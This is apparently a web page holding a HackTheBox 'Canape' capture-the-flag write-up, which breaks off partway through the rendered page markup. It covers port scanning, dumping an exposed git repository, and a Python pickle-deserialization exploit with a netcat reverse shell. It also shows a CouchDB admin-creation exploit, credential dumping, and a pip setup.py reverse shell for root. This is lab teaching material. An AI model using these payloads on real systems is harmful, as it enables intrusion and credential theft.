@@ -1,0 +1,547 @@
+<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Canape | CyFun</title><meta name=keywords content="ctf,hackthebox,penetration-testing,writeup,linux,recon,network,web,python"><meta name=description content="Canape HackTheBox writeup"><meta name=author content="s4ch"><link rel=canonical href=https://s4ch.github.io/writeups/hackthebox/canape/><link crossorigin=anonymous href=/assets/css/stylesheet.8c2cb9234a4e634b8528951f7a47ea89181178c7d2c333ce2c08dfee541ed427.css integrity="sha256-jCy5I0pOY0uFKJUfekfqiRgReMfSwzPOLAjf7lQe1Cc=" rel="preload stylesheet" as=style><link rel=icon href=https://s4ch.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://s4ch.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://s4ch.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://s4ch.github.io/apple-touch-icon.png><link rel=mask-icon href=https://s4ch.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://s4ch.github.io/writeups/hackthebox/canape/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="Canape"><meta property="og:description" content="Canape HackTheBox writeup"><meta property="og:type" content="article"><meta property="og:url" content="https://s4ch.github.io/writeups/hackthebox/canape/"><meta property="og:image" content="https://s4ch.github.io/writeups/hackthebox/canape/canape.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2019-07-13T00:00:00+00:00"><meta property="article:modified_time" content="2026-03-01T00:10:22+05:30"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/tenet/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/scriptkiddie/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/delivery/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/ready/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/laboratory/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/passage/"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://s4ch.github.io/writeups/hackthebox/canape/canape.png"><meta name=twitter:title content="Canape"><meta name=twitter:description content="Canape HackTheBox writeup"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://s4ch.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"HackTheBox Writeups","item":"https://s4ch.github.io/writeups/hackthebox/"},{"@type":"ListItem","position":3,"name":"Canape","item":"https://s4ch.github.io/writeups/hackthebox/canape/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Canape","name":"Canape","description":"Canape HackTheBox writeup","keywords":["ctf","hackthebox","penetration-testing","writeup","linux","recon","network","web","python"],"articleBody":"💢 Info Name: Canape Profile: www.hackthebox.eu Difficulty: Medium OS: Linux Points: 30 Network Enumeration / Reconnaissance Let’s get started with a full port scan to see which ports are open by using nmap.\n1 nmap -p- -R -T4 -sS --open --max-retries 2 --min-rate 500 --initial-rtt-timeout 300ms --min-rtt-timeout 50ms --max-rtt-timeout 300ms --max-scan-delay 1 -Pn 10.10.10.70 -v -oG fullport.scan -f -d -p- = -p 1-65535: all ports R: always do DNS resolution -T4: scan speed level 4 -sS: SYN scan --open: show only open ports -Pn: disable ping (no host discovery, assume the host is alive) -v: verbose -oG grepable output -f (fragment) = --mtu (maximum transmission unit): fragment packets for firewall and IDS evasion -d: debug other options are advanced network optimizations I found only two ports open, one is HTTP and the other is unknown:\n1 2 3 PORT STATE SERVICE REASON 80/tcp open http syn-ack ttl 63 65535/tcp open unknown syn-ack ttl 63 So let’s run a more aggressive scan in order to get more information:\n1 nmap -sT -p80,65535 -Pn -n -A 10.10.10.70 -oG aggressive.scan -v -d -A: aggressive scan; this enables OS detection (-O), version scanning (-sV), script scanning (-sC) and traceroute (–traceroute) sT: TCP scan -n: never do DNS resolution This time there is more information about the protocols:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 PORT STATE SERVICE REASON VERSION 80/tcp open http syn-ack Apache httpd 2.4.18 ((Ubuntu)) |_http-favicon: Unknown favicon MD5: CCD1870C3EB5C66B66D9E5A31B7A7DF6 | http-methods: |_ Supported Methods: GET HEAD OPTIONS |_http-title: Simpsons Fan Site |_http-trane-info: Problem with XML parsing of /evox/about 65535/tcp open ssh syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 8d:82:0b:31:90:e4:c8:85:b2:53:8b:a1:7c:3b:65:e1 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDroCKFvZBROo3eo64hlNjhERjTLQmRgbCaDGhoWgs6qf9AfuTfS7LMX82ayuBjV0OHbk6Saf3SKwyLFfyLKj/mo8yGNpGjsZQ9uiN6hlpO39oQyjo9dy5DUfAabcoq82ugii982GWeHlTShQJAhAsG+7Uov2mUbO3YkKph/PBEv3uuAnNebhxlk9eg01yuHkk+8iyP6+Qp9ZzAVZsXpSuoH0raBA7VOIlYnm4Wti1AHy3VUtvmrB4KwZQT8Q3ZyMbufWFZlDB0N0/cEvyXF0kKwRIT1hNjp4HUNo0dwcDOWuwvrWVUpH3/q8VXkZRN3fL2gHsIsfuh+AyThM14hf/h | 256 22:fc:6e:c3:55:00:85:0f:24:bf:f5:79:6c:92:8b:68 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLX3HkUlvdwKR+Ijy9ChJwvV7ILAPCEver9hmIr546JbveSJNyvOiq6y3YxfQu3IXomvonySAU10Fo8wVQ7kxWk= | 256 0d:91:27:51:80:5e:2b:a3:81:0d:e9:d8:5c:9b:77:35 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJvWPxb1XOvko0SIhYrC5TYyQpU8tugg1qirZdtt3CXX Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port OS fingerprint not ideal because: Missing a closed TCP port so results incomplete Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.16 (92%), Linux 3.16 - 4.6 (92%), Linux 3.18 (92%), Linux 3.2 - 4.9 (92%), Linux 4.2 (92%), Linux 3.12 (90%), Linux 3.13 (90%), Linux 3.13 or 4.2 (90%), Linux 3.8 - 3.11 (90%) No exact OS matches for host (test conditions non-ideal). TCP/IP fingerprint: SCAN(V=7.70%E=4%D=5/1%OT=80%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=5AE8DD31%P=x86_64-unknown-linux-gnu) SEQ(SP=FB%GCD=1%ISR=10B%TI=Z%II=I%TS=8) OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11) WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120) ECN(R=Y%DF=Y%TG=40%W=7210%O=M54DNNSNW7%CC=Y%Q=) T1(R=Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=) T2(R=N) T3(R=N) T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=) U1(R=N) IE(R=Y%DFI=N%TG=40%CD=S) Finally there was a ssh server behind port 65535.\nService (HTTP) Enumeration / Reconnaissance Let’s load the website and take a look at the source code:\n1 2 3 4 5 6 There is a hash here, we can use hashid to identify the hash type.\n1 2 3 4 5 6 7 8 9 10 11 $ hashid c8a74a098a60aaea1af98945bd707a7eab0ff4b0 Analyzing 'c8a74a098a60aaea1af98945bd707a7eab0ff4b0' [+] SHA-1 [+] Double SHA-1 [+] RIPEMD-160 [+] Haval-160 [+] Tiger-160 [+] HAS-160 [+] LinkedIn [+] Skein-256(160) [+] Skein-512(160) So the hash was probably generated with SHA1.\nNow I will use a web directory and file scanner like dirb or dirsearch to try to find some interesting unlinked content.\nWith the help of one of the previously mentioned tool, I quickly found the /.git/ directory, which is, of course, a git repository.\nSo I will dump http://10.10.10.70/.git/ in order to get the git repository locally and be able to browse it with the git CLI.\nIn order to dump the git repository, I used GitTools and its dumper script:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 $ ~/CTF/tools/GitTools/Dumper/gitdumper.sh http://10.10.10.70/.git/ gitdir $ cd gitdir $ git --no-pager log --oneline 92eb5eb (HEAD -\u003e master) final 524f9dd final 999b869 remove a a762ade a f197cbf remove doh 36acc97 add doh fb79852 remove f 64ed42c add f 7b15317 MORE TROLLS a389475 trollface f9be9a9 add note c8a74a0 temporarily hide check due to vulerability e7bfbcf initial $ git checkout 524f9dd With git checkout 524f9dd I jumped to a previous commit tagged as final.\nThen I reviewed a python file named __init__.py:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 import couchdb import string import random import base64 import cPickle from flask import Flask, render_template, request from hashlib import md5 app = Flask(__name__) app.config.update( DATABASE = \"simpsons\" ) db = couchdb.Server(\"http://localhost:5984/\")[app.config[\"DATABASE\"]] @app.errorhandler(404) def page_not_found(e): if random.randrange(0, 2) \u003e 0: return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(random.randrange(50, 250))) else: return render_template(\"index.html\") @app.route(\"/\") def index(): return render_template(\"index.html\") @app.route(\"/quotes\") def quotes(): quotes = [] for id in db: quotes.append({\"title\": db[id][\"character\"], \"text\": db[id][\"quote\"]}) return render_template('quotes.html', entries=quotes) WHITELIST = [ \"homer\", \"marge\", \"bart\", \"lisa\", \"maggie\", \"moe\", \"carl\", \"krusty\" ] @app.route(\"/submit\", methods=[\"GET\", \"POST\"]) def submit(): error = None success = None if request.method == \"POST\": try: char = request.form[\"character\"] quote = request.form[\"quote\"] if not char or not quote: error = True elif not any(c.lower() in char.lower() for c in WHITELIST): error = True else: # TODO - Pickle into dictionary instead, `check` is ready p_id = md5(char + quote).hexdigest() outfile = open(\"/tmp/\" + p_id + \".p\", \"wb\") outfile.write(char + quote) outfile.close() success = True except Exception as ex: error = True return render_template(\"submit.html\", error=error, success=success) @app.route(\"/check\", methods=[\"POST\"]) def check(): path = \"/tmp/\" + request.form[\"id\"] + \".p\" data = open(path, \"rb\").read() if \"p1\" in data: item = cPickle.loads(data) else: item = data return \"Still reviewing: \" + item if __name__ == \"__main__\": app.run() The file is describing the web application behavior.\nI can quickly note there is a CouchDB server running on localhost:5984.\nThe web application is listing some Simpsons quotes and also allow us to submit some. So I can only submit quotes from whitelist Simpsons characters. Once submitted, the quote will be stored in a file name \"/tmp/\" + md5(char + quote).hexdigest() + \".p. So I know exactly where the file will be stored and how it will be named.\nThe normal behavior will be to submit a quote like this:\n1 $ curl -X POST -H 'Content-Type: application/x-www-form-urlencoded' http://10.10.10.70/submit -d 'character=homer\u0026quote=testttttt' Then we can check the quote was saved by computing the file id which is used for the file name and request it:\n1 2 3 4 $ printf %s%s 'homer' 'testttttt' | md5sum | awk '{ print $1 }' | tr -d '\\n' 736dec3d7d835c35578fd1d4cf54d389 $ curl -X POST -H 'Content-Type: application/x-www-form-urlencoded' http://10.10.10.70/check -d 'id=736dec3d7d835c35578fd1d4cf54d389' Exploiting the web application vulnerability Did you spotted the vulnerability in the source code?\nWhen doing the check, the web application is loading the content of the quote file into Pickle.\nNote: Pickle is a python library used to serialize python objects.\nWhy this is a vulnerability? Because pickle deserialization can lead to arbitrary code execution if the data passed to it is unsafe, like in our case, controlled by the user.\nThere are various article on Internet explaining what is deserialization, Pickle or its exploitation like this one: Explaining and exploiting deserialization vulnerability with Python.\nSo here we are:\nWe can control the data passed to cPickle (so we can make some code executed) We know where the file is stored (so we can trigger the payload) We have the source code (so we are able to build a valid payload targeting the web application) I created the following payload in python (name pickle_exploit.py):\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 import re, cPickle, hashlib, requests, os class shell(object): def __init__(self): self.reverse_ip = \"10.10.14.216\" self.reverse_port = \"42424\" def __reduce__(self): return (os.system, (\"rm /tmp/shell; mknod /tmp/shell p; nc %s %s \u003c /tmp/shell | /bin/bash \u003e /tmp/shell\" %(self.reverse_ip, self.reverse_port),)) if __name__ == \"__main__\": character = \"S'homer'\\n\" quote = cPickle.dumps(shell()) if re.search('Success!', requests.post('http://10.10.10.70/submit', data={\"character\":character, \"quote\":quote}).text): print 'Success' p_id = hashlib.md5(character + quote).hexdigest() print requests.post(\"http://10.10.10.70/check\", data={\"id\":p_id}).text This payload will create a reverse shell, so the server will connect back on a listener I’m controlling and offer me a bash shell.\nLet’s start a listener and set some proper TTY environment once we are connected on the remote shell:\n1 2 3 $ stty raw -echo $ nc -lvnp 42424 $ SHELL=/bin/bash script -q /dev/null You’ll tell me, what is the black magic around netcat?\nThis is basically for Upgrading simple shells to fully interactive TTYs. If you are curious you can read the previously linked article and also the following man page STTY(1) and SCRIPT(1).\nPrivilege Escalation of Machine - From service to user The goal of Privilege Escalation of Machine a.k.a. Privilege Escalation (priv esc or PE), is to go from a low privilege access tp a high privilege one. So here on a linux system we will try to get root.\nBut before attacking a vulnerable service, I must find it!\nA good idea if not using an automated tool, is to stick to an enumeration guide like this one: Basic Linux Privilege Escalation.\nThe first thing we need to know is, on which operating system (OS) are we and with which kernel:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 $ cat /etc/os-release NAME=\"Ubuntu\" VERSION=\"16.04.4 LTS (Xenial Xerus)\" ID=ubuntu ID_LIKE=debian PRETTY_NAME=\"Ubuntu 16.04.4 LTS\" VERSION_ID=\"16.04\" HOME_URL=\"http://www.ubuntu.com/\" SUPPORT_URL=\"http://help.ubuntu.com/\" BUG_REPORT_URL=\"http://bugs.launchpad.net/ubuntu/\" VERSION_CODENAME=xenial UBUNTU_CODENAME=xenial $ uname -r 4.4.0-119-generic We are lucky, we won’t need to do much enumeration. Remember? In the web application source code, we saw there was a CouchDB server. Let’s see what the service has to answer:\n1 2 3 4 5 6 7 $ curl http://localhost:5984/ {\"couchdb\":\"Welcome\",\"version\":\"2.0.0\",\"vendor\":{\"name\":\"The Apache Software Foundation\"}} root 649 642 0 11:38 ? Ss 0:00 \\_ runsv couchdb root 650 649 0 11:38 ? S 0:00 \\_ svlogd -tt /var/log/couchdb : homer 663 649 0 11:38 ? Sl 1:57 \\_ /home/homer/bin/../erts-7.3/bin/beam -K true -A 16 -Bd -- -root /home/homer/bin/.. -progname couchdb -- -home /home/homer -- -boot /home/homer/bin/../releases/2.0.0/couchdb -name couchdb@localhost -setcookie monster -kernel error_logger silent -sasl sasl_error_logger false -noshell -noinput -config /home/homer/bin/../releases/2.0.0/sys.config Now, I know the Apache CouchDB is in version 2.0.0. Bad luck for them! This version is vulnerable and impacted by some critical issues.\nSome public vulnerabilities: https://www.cvedetails.com/vulnerability-list/vendor_id-45/product_id-19046/version_id-230263/Apache-Couchdb-2.0.0.html The public exploit I will use: https://www.exploit-db.com/exploits/44498/ Apache CouchDB JSON Remote Privilege Escalation Vulnerability (CVE-2017-12635) This exploit script will exploit the JSON API to create an admin user. As it is fairly easy, I will do it manually instead.\n1 2 3 $ curl -X PUT -H 'Content-Type: application/json' -d '{\"type\": \"user\", \"name\": \"cyfun\", \"roles\": [\"_admin\"], \"roles\": [], \"password\": \"nopass\"}' http://localhost:5984/_users/org.couchdb.user:cyfun cyfun {\"ok\":true,\"id\":\"org.couchdb.user:cyfun\",\"rev\":\"1-e140e509077e57fd6bd5b5491b7c0e09\"} Now I have a CouchDB admin user cyfun with password nopass.\nApache CouchDB documentation is available here but you won’t be able to read 2.0.0 documentation as it has been archived. So you will have to download the PDF or HTML zip from here.\nYou also read the PDF directly with Firefox(thanks to PDF.js): https://buildmedia.readthedocs.org/media/pdf/couchdb/2.0.0/couchdb.pdf\nOn page 217, the endpoint /_all_dbs is described:\nReturns a list of all the databases in the CouchDB instance.\n1 2 $ curl -X GET http://cyfun:nopass@127.0.0.1:5984/_all_dbs -H 'Content-Type: application/json' '[\"_global_changes\",\"_metadata\",\"_replicator\",\"_users\",\"passwords\",\"simpsons\"]' We can see there is a database _users and a one named password.\nOn page 249, the endpoint /db/_all_docs is described:\nApache CouchDB, Release 2.0.0{\"_id\": “FishStew”,“servings”: 4,“subtitle”: “Delicious with fresh bread”,“title”: “Fish Stew”}Response:HTTP/1.1 202 AcceptedCache-Control: must-revalidateContent-Length: 28Content-Type: application/jsonDate: Tue, 13 Aug 2013 15:19:25 GMTLocation: http://localhost:5984/db/FishStewServer: CouchDB (Erlang/OTP){“id”: “FishStew”,“ok”:true}10.3.2/db/_all_docsGET /{db}/_all_docsReturns a JSON structure of all of the documents in a given database. The information is returned as a JSONstructure containing meta information about the return structure, including a list of all documents and basiccontents, consisting the ID, revision and key. The key is the from the document’s _id.\nLet’s see the database _users first:\n1 2 3 4 5 $ curl -X GET -H 'Content-Type: application/json' http://cyfun:nopass@127.0.0.1:5984/_users/_all_docs {\"total_rows\":2,\"offset\":0,\"rows\":[ {\"id\":\"_design/_auth\",\"key\":\"_design/_auth\",\"value\":{\"rev\":\"1-75efcce1f083316d622d389f3f9813f7\"}}, {\"id\":\"org.couchdb.user:cyfun\",\"key\":\"org.couchdb.user:cyfun\",\"value\":{\"rev\":\"1-e140e509077e57fd6bd5b5491b7c0e09\"}} ]} Nothing much interesting here.\nNow the database password:\n1 2 3 4 5 6 7 $ curl -X GET -H 'Content-Type: application/json' http://cyfun:nopass@127.0.0.1:5984/passwords/_all_docs {\"total_rows\":4,\"offset\":0,\"rows\":[ {\"id\":\"739c5ebdf3f7a001bebb8fc4380019e4\",\"key\":\"739c5ebdf3f7a001bebb8fc4380019e4\",\"value\":{\"rev\":\"2-81cf17b971d9229c54be92eeee723296\"}}, {\"id\":\"739c5ebdf3f7a001bebb8fc43800368d\",\"key\":\"739c5ebdf3f7a001bebb8fc43800368d\",\"value\":{\"rev\":\"2-43f8db6aa3b51643c9a0e21cacd92c6e\"}}, {\"id\":\"739c5ebdf3f7a001bebb8fc438003e5f\",\"key\":\"739c5ebdf3f7a001bebb8fc438003e5f\",\"value\":{\"rev\":\"1-77cd0af093b96943ecb42c2e5358fe61\"}}, {\"id\":\"739c5ebdf3f7a001bebb8fc438004738\",\"key\":\"739c5ebdf3f7a001bebb8fc438004738\",\"value\":{\"rev\":\"1-49a20010e64044ee7571b8c1b902cf8c\"}} ]} Looks like there are 4 passwords here but only a reference to them. So I just have to request those id:\n1 2 3 4 5 6 7 8 9 10 11 $ curl -X GET -H 'Content-Type: application/json' http://cyfun:nopass@127.0.0.1:5984/passwords/739c5ebdf3f7a001bebb8fc4380019e4 {\"_id\":\"739c5ebdf3f7a001bebb8fc4380019e4\",\"_rev\":\"2-81cf17b971d9229c54be92eeee723296\",\"item\":\"ssh\",\"password\":\"0B4jyA0xtytZi7esBNGp\",\"user\":\"\"} $ curl -X GET -H 'Content-Type: application/json' http://cyfun:nopass@127.0.0.1:5984/passwords/739c5ebdf3f7a001bebb8fc43800368d {\"_id\":\"739c5ebdf3f7a001bebb8fc43800368d\",\"_rev\":\"2-43f8db6aa3b51643c9a0e21cacd92c6e\",\"item\":\"couchdb\",\"password\":\"r3lax0Nth3C0UCH\",\"user\":\"couchy\"} $ curl -X GET -H 'Content-Type: application/json' http://cyfun:nopass@127.0.0.1:5984/passwords/739c5ebdf3f7a001bebb8fc438003e5f {\"_id\":\"739c5ebdf3f7a001bebb8fc438003e5f\",\"_rev\":\"1-77cd0af093b96943ecb42c2e5358fe61\",\"item\":\"simpsonsfanclub.com\",\"password\":\"h02ddjdj2k2k2\",\"user\":\"homer\"} $ curl -X GET -H 'Content-Type: application/json' http://cyfun:nopass@127.0.0.1:5984/passwords/739c5ebdf3f7a001bebb8fc438004738 {\"_id\":\"739c5ebdf3f7a001bebb8fc438004738\",\"_rev\":\"1-49a20010e64044ee7571b8c1b902cf8c\",\"user\":\"homerj0121\",\"item\":\"github\",\"password\":\"STOP STORING YOUR PASSWORDS HERE -Admin\"} As it is all about Simpsons from the beginning, let’s target the user homer with password h02ddjdj2k2k2 and try to connect to ssh with those credentials.\n1 2 3 4 $ ssh homer@10.10.10.70 -p 65535 homer@canape:~$ cat user.txt bce918696f293e62b2321703bb27288d Success!\nPrivilege Escalation of Machine - From user to root Here I’m lucky again, no need for enumeration or exploits, just the ultimately basic check:\n1 2 3 4 5 6 7 8 homer@canape:~$ sudo -l [sudo] password for homer: Matching Defaults entries for homer on canape: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User homer may run the following commands on canape: (root) /usr/bin/pip install * It seems we can install any python package with pip as root!\nSo let’s create one that will bring me a root shell:\n1 2 $ cd $ vim setup.py 1 2 3 4 5 6 7 import socket,subprocess,os s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.connect((\"10.10.14.63\",33333)) os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) p=subprocess.call([\"/bin/bash\",\"-i\"]); Now I just have to install it as root:\n1 $ sudo /usr/bin/pip install -e . setup.py Bingo!\n1 2 3 root@canape:~# cat /root/root.txt cat /root/root.txt 928c3df1a12d7f67d2e8c2937120976d ","wordCount":"2291","inLanguage":"en","image":"https://s4ch.github.io/writeups/hackthebox/canape/canape.png","datePublished":"2019-07-13T00:00:00Z","dateModified":"2026-03-01T00:10:22+05:30","author":{"@type":"Person","name":"s4ch"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://s4ch.github.io/writeups/hackthebox/canape/"},"publisher":{"@type":"Organization","name":"CyFun","logo":{"@type":"ImageObject","url":"https://s4ch.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://s4ch.github.io/ accesskey=h title="CyFun (Alt + H)">CyFun</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)">
+<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
+<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://s4ch.github.io/about/ title=About><span>About</span></a></li><li><a href=https://s4ch.github.io/contact/ title=Contact><span>Contact</span></a></li><li><a href=https://s4ch.github.io/research/ title=Research><span>Research</span></a></li><li><a href=https://s4ch.github.io/archives title=Archives><span>Archives</span></a></li><li><a href=https://s4ch.github.io/docs/ title=Docs><span>Docs</span></a></li><li><a href=https://s4ch.github.io/ctf/ title=CTF><span>CTF</span></a></li><li><a href=https://s4ch.github.io/blog/ title=Blog><span>Blog</span></a></li><li><a href=https://s4ch.github.io/writeups/ title=Writeups><span>Writeups</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">Canape</h1><div class=post-description>Canape HackTheBox writeup</div><div class=post-meta><span title='2019-07-13 00:00:00 +0000 UTC'>July 13, 2019</span>&nbsp;·&nbsp;11 min&nbsp;·&nbsp;2291 words&nbsp;·&nbsp;
+<a href=https://s4ch.github.io/tags/ctf/ class=post-tag title=ctf>ctf</a>
+,
+<a href=https://s4ch.github.io/tags/hackthebox/ class=post-tag title=hackthebox>hackthebox</a>
+,
+<a href=https://s4ch.github.io/tags/penetration-testing/ class=post-tag title=penetration-testing>penetration-testing</a>
+,
+<a href=https://s4ch.github.io/tags/writeup/ class=post-tag title=writeup>writeup</a>
+,
+<a href=https://s4ch.github.io/tags/linux/ class=post-tag title=linux>linux</a>
+,
+<a href=https://s4ch.github.io/tags/recon/ class=post-tag title=recon>recon</a>
+,
+<a href=https://s4ch.github.io/tags/network/ class=post-tag title=network>network</a>
+,
+<a href=https://s4ch.github.io/tags/web/ class=post-tag title=web>web</a>
+,
+<a href=https://s4ch.github.io/tags/python/ class=post-tag title=python>python</a>
+&nbsp;·&nbsp;
+<a href=https://s4ch.github.io/categories/writeups/ class=post-tag title=writeups>writeups</a></div></header><figure class=entry-cover><img loading=eager src=https://s4ch.github.io/writeups/hackthebox/canape/canape.png alt="Canape HackTheBox Machine"><p>Canape - Medium Linux Machine</p></figure><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#-info>💢 Info</a><ul><li><a href=#network-enumeration--reconnaissance>Network Enumeration / Reconnaissance</a></li><li><a href=#service-http-enumeration--reconnaissance>Service (HTTP) Enumeration / Reconnaissance</a></li><li><a href=#exploiting-the-web-application-vulnerability>Exploiting the web application vulnerability</a></li><li><a href=#privilege-escalation-of-machine----from-service-to-user>Privilege Escalation of Machine - From service to user</a></li><li><a href=#privilege-escalation-of-machine----from-user-to-root>Privilege Escalation of Machine - From user to root</a></li></ul></li></ul></nav></div></details></div><div class=post-content><h2 id=-info>💢 Info<a hidden class=anchor aria-hidden=true href=#-info>#</a></h2><ul><li><strong>Name:</strong> Canape</li><li><strong>Profile:</strong> <a href=https://www.hackthebox.eu/home/machines/profile/134>www.hackthebox.eu</a></li><li><strong>Difficulty:</strong> Medium</li><li><strong>OS:</strong> Linux</li><li><strong>Points:</strong> 30</li></ul><p><img loading=lazy src=/writeups/hackthebox/canape/canape.png alt=canape></p><h3 id=network-enumeration--reconnaissance>Network Enumeration / Reconnaissance<a hidden class=anchor aria-hidden=true href=#network-enumeration--reconnaissance>#</a></h3><p>Let&rsquo;s get started with a full <em>port scan</em> to see which ports are open by using <a href=https://nmap.org/>nmap</a>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>nmap -p- -R -T4 -sS --open --max-retries 2 --min-rate 500 --initial-rtt-timeout 300ms --min-rtt-timeout 50ms --max-rtt-timeout 300ms --max-scan-delay 1 -Pn 10.10.10.70 -v -oG fullport.scan -f -d
+</span></span></code></pre></td></tr></table></div></div><ul><li><code>-p-</code> = <code>-p 1-65535</code>: all ports</li><li><code>R</code>: always do DNS resolution</li><li><code>-T4</code>: scan speed level 4</li><li><code>-sS</code>: SYN scan</li><li><code>--open</code>: show only open ports</li><li><code>-Pn</code>: disable ping (no host discovery, assume the host is alive)</li><li><code>-v</code>: verbose</li><li><code>-oG</code> grepable output</li><li><code>-f</code> (fragment) = <code>--mtu</code> (maximum transmission unit): fragment packets for firewall and IDS evasion</li><li><code>-d</code>: debug</li><li>other options are advanced network optimizations</li></ul><p>I found only two ports open, one is HTTP and the other is unknown:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>PORT      STATE SERVICE REASON
+</span></span><span class=line><span class=cl>80/tcp    open  http    syn-ack ttl 63
+</span></span><span class=line><span class=cl>65535/tcp open  unknown syn-ack ttl 63
+</span></span></code></pre></td></tr></table></div></div><p>So let&rsquo;s run a more aggressive scan in order to get more information:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>nmap -sT -p80,65535 -Pn -n -A 10.10.10.70 -oG aggressive.scan -v -d
